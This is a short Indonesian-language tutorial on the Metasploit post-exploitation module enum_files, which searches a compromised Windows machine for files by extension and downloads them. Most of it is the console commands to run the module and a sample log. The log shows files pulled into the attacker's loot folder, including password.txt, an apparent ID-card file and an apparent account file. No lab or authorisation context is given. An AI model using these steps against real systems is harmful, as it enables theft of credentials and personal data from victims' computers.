# enum_files

Modul `enum_files` di Metasploit adalah modul `post-exploitation `untuk sistem Windows yang digunakan untuk mencari dan mengumpulkan daftar file berdasarkan ekstensi tertentu seperti `.pdf`, `.docx`, `.txt`, dan `lainnya` dari komputer target.
## Cara Penggunaan di Metasploit

```
use post/windows/gather/enum_files
set FILE_GLOBS *.txt
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Searching C:\Users\ through windows user profile structure
[*] Downloading C:\Users\admin\Downloads\windows_7_8_81_32_64bit_1027.3\windows_7_8_81_32_64bit_1027.3\Release notes\ISS_Release.txt
[+] ISS_Release.txt saved as: /root/.msf4/loot/20250516123106_default_192.168.1.52_host.files_316311.txt
[*] Downloading C:\Users\admin\Downloads\windows_7_8_81_32_64bit_1027.3\windows_7_8_81_32_64bit_1027.3\Release notes\Release_RTWlanU.txt
[+] Release_RTWlanU.txt saved as: /root/.msf4/loot/20250516123106_default_192.168.1.52_host.files_362125.txt
[*] Downloading C:\Users\admin\Downloads\windows_7_8_81_32_64bit_1027.3\windows_7_8_81_32_64bit_1027.3\Release notes\Utility_Release.txt
[+] Utility_Release.txt saved as: /root/.msf4/loot/20250516123107_default_192.168.1.52_host.files_713887.txt
[*] Downloading C:\Users\admin\Downloads\windows_7_8_81_32_64bit_1027.3(1)\windows_7_8_81_32_64bit_1027.3\Release notes\ISS_Release.txt
[+] ISS_Release.txt saved as: /root/.msf4/loot/20250516123107_default_192.168.1.52_host.files_313018.txt
[*] Downloading C:\Users\admin\Downloads\windows_7_8_81_32_64bit_1027.3(1)\windows_7_8_81_32_64bit_1027.3\Release notes\Release_RTWlanU.txt
[+] Release_RTWlanU.txt saved as: /root/.msf4/loot/20250516123107_default_192.168.1.52_host.files_663615.txt
[*] Downloading C:\Users\admin\Downloads\windows_7_8_81_32_64bit_1027.3(1)\windows_7_8_81_32_64bit_1027.3\Release notes\Utility_Release.txt
[+] Utility_Release.txt saved as: /root/.msf4/loot/20250516123108_default_192.168.1.52_host.files_218646.txt
[*] Downloading C:\Users\admin\Desktop\password.txt
[+] password.txt saved as: /root/.msf4/loot/20250516123108_default_192.168.1.52_host.files_562665.txt
[*] Downloading C:\Users\admin\Desktop\KTP SAYA.txt
[+] KTP SAYA.txt saved as: /root/.msf4/loot/20250516123108_default_192.168.1.52_host.files_967686.txt
[*] Downloading C:\Users\admin\Desktop\AKUN PB.txt
[+] AKUN PB.txt saved as: /root/.msf4/loot/20250516123109_default_192.168.1.52_host.files_165012.txt
[*] Done!
[*] Post module execution completed
```
